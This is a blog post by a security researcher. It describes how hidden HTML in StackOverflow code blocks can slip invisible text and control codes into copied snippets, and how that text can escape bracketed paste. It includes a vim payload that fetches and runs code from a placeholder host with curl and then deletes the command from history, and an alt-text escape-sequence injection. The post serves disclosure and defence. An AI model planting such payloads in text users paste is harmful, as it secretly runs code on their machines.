---
layout: post
title: Surprise functionality in StackOverflow copy-pasted code
---
Because Markdown is really a mixture of Markdown syntax and raw HTML to
fill in gaps where Markdown can't do the job, having user-generated
content in Markdown format doesn't help to curb malicious content.
Users are still publishing HTML and have opportunities to embed
something malicious or sneaky.

In the case of StackOverflow, you end up being able to do things like
switch to `<pre>` formatting without escaping all of the contained text
as raw code; so you can embed HTML in the blocks which look like the
code you would want to copy-paste, but with surprise semantics.

You can embed images, for example, and provide alt text for those
images, and you can make those images practically invisible, so that
when people copy the text in the code block you provide they'll also
pick up the alt text which they couldn't see on the web page.

Like so:
```markdown
Here is my solution:

<pre>my<img src="https://example.com/invisible_image.gif" alt=" malicious"/> code</pre>

It's really good!
```

You can go try things out in a [sandbox][].  Be warned that not
everything that appears in the preview window is going to turn out
exactly the same once you post it.

Imagine the possibilities!

And yes, I _have_ reported those possibilities which I could imagine to
Stack Exchange.  More on that later.

If you're clever then you might be able to drop in an extra character
somewhere which has a profound effect on the meaning of the code.

You can alse emulate non-printing keystrokes by sending their escape
sequences or control codes.  This leads applications to take actions
based on those keystrokes rather than inserting them into an edit buffer
as plain old text.

What sort of keystrokes might you insert?  It depends on where you
expect that the text will be pasted.  Maybe a newline, to make a command
execute before the user is ready; and/or some backspaces to subtly
modify the text after it's been reviewed (replace an 8 with an &, for
example).

But those can be detected easily.  Something more nefarious would be to
target a text editor.  For example I made a proof of concept targeting
vim.  To maximise the chances that the user will be using vim when they
paste your text you simply offer a swatch of text to be pasted into
`~/.vimrc`, and if somebody wants to modify that file what editor do you
think they're going to use?  Probably not emacs.

So if you know you're in vim you could embed something like an escape
character, to enter command mode, and then some commands, like these
ones:

```vim
:call system('(curl -s https://example.com/evilcode|sh)&')
:call histdel('cmd','evilcode')
```
After that drop back into insert mode and keep adding plausible text to
the file to clear the status line of the result of the last command.

Notice that these are both short commands which will almost certainly
fit on one line.  If they're longer then there's a much greater risk
that the drawing and redrawing of a multi-line command buffer will be
visible to the user, if only in a brief flash which might attract
unwanted attention.

The first executes a shell to get curl to download some code and run it;
and it does so in the background rather than waiting for it to finish.
The second deletes every history entry containing `evilcode`, so it
deletes evidence of our malicious act and, conveniently, it deletes
itself as well.

There we go.  Running arbitrary code on a user's computer already.  What
fun!

Would I be telling you this if it was really so easy?  No.  OK, maybe.
But it's not.

To mitigate this the terminal and application or shell should be using
[bracketed paste][], which ensures that pasted text is surrounded by
delimiters which indicate that it shouldn't be interpreted as escape
sequences but raw text to be inserted into the file or whatever.

But those delimiters are what?  They're escape sequences.  So you just
put the end marker for bracketed paste into your text in order to make
everything after that be interpreted by the application as keyboard
input again -- just like before bracketed paste was a thing.

Like so:
```html
<img alt="&#27;[201~ keyboard input here" ...>
```

Thankfully a lot of terminals (and after a few months of proking and
prodding developers, a few more terminals) strip out some control codes
from pasted text, and this breaks the ability to embed the codes
necessary to escape bracketed paste mode this way.

OSX's Terminal.app even brings up a message box explicitly telling you
you're under attack if it sees the relevant escape sequence.  I think
that's great.  Most other terminals just strip out control codes in some
way or other.

I can't promise that all terminals are filtering correctly, though.

There's yet another potential weakness, though.  If you can get an
incomplete escape sequence sent then the application can be tricked into
_missing_ the begin-bracketed-paste escape sequence.  To illustrate this
you can simply hit Escape right before pasting something into the
terminal when it should be using bracketed paste.  The resulting
double-escape can cause the bracketed paste opening to be mis-parsed, so
everything that follows is still seen as keystrokes.  You might not be
able to send escapes, but you might still get backspace and newline
through.

To set up such preconditions might take a bit of network timing
manipulation, or remarkable knowledge of unfixed bugs in termcap
entries, or some kind of social engineering to exploit this, so maybe
we're all safe.

I can't promise that, though.

So you might be asking "where's the responsible disclosure?".  Well, I
went through it all years ago.  I tried to cut this off at StackOverflow
first (don't let people embed surprise text, don't let people embed
control codes in text), and then in the browser (don't copy control
codes embedded in HTML text), and then in some terminals (don't let
escape sequences escape the esape sequence that says to ignore other
escape sequences).  For the most part the issue was dismissed as
somebody else's problem, and everybody preferred to keep things as they
are rather than risk breaking some unspecified case which somebody might
be using legitimately.

The only people to take me seriously were Apple, and I got an SVE out of
it for my efforts.  That's probably because I gave them a whole proof of
concept which ran arbitrary code and made it invisible to the user that
arbitrary code had been run (except that I waved a flag to say it had
happened to prove it).

Of course there are still gaps that I see.  There will always be gaps
when systems we rely on are assembled the way they are.  There is a
_lot_ I do not agree with in the way things were designed, here.  The
intrinsic weakness of layers upon layers of escape sequences is absurd
to me, but it's also industry standard and an evergrowing problem as
people design more systems which function this way.  It's become
normalised and there's no stopping it anymore.


[bracketed paste]: <https://en.wikipedia.org/wiki/Bracketed-paste>
[sandbox]: <https://meta.stackexchange.com/q/3122/227423>
[My PoC]: <https://security.stackexchange.com/a/183377>
